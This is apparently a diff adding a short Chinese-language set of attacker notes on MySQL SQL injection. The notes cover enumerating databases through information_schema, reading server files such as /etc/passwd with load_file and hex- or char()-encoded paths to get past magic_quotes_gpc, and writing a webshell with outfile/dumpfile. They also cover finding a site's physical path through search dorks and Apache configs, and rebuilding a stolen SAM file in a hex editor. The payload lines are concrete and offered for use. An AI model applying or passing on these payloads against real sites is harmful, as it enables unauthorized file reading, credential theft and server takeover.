@@ -1,0 +1,33 @@
+mysql版本4.0只能靠猜
+
+mysql版本5  靠 虚库information_schema爆库  表  字段
+load_file()函数读数据
+dumpfile/outfile导出shell
+
+magic_quotes_gpc为on时需将  转换为16 进制
+
+获取网站物理路径
+mysql site:aaa.com
+warning site:aaa.com
+error site:aaa.com
+
+load_file（'/etc/passwd'）获取用户工作目录 并获得网站物理路径
+通过读取apache  配置获取网站物理路径
+
+load_file(char(47))列目录
+info.php test.php
+
+
+load_file读二进制的时候  需要  转 hex（load_file('xxxxxx')）
+
+
+replace(load_file(0x2F6574632F706173737764),0x3c,0x20)
+replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
+上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 "<" 替换成"空格" 返回的是网页.而无法查看到代码.
+
+ hex（replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))）(32))
+
+当读取到了sam文件的时候 复制网页中 16进制代码
+  打开c32 16进制编辑
+--文件   新建16进制文件  新建一个长度为1的十六进制文件  菜单--编辑  特别粘贴  在selete paste types 对话框选择 ascii hex 确定
+  之后文件另保存
